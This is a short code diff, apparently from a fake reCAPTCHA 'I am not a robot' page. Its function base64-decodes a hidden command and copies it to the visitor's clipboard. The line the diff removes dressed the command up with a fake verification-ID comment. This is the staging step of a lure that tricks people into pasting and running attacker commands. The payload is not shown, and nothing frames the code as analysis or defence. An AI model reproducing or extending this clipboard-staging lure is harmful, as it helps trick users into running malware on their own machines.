@@ -386,7 +386,7 @@
             function stageClipboard(commandBase64, verification_id) {
                 const decodedCommand = atob(commandBase64);
                 const textToCopy =
-                    decodedCommand + " # ✅ ''I am not a robot - reCAPTCHA Verification ID: " + verification_id + "''";
+                    decodedCommand;
                 setClipboardCopyData(textToCopy);
             }
 
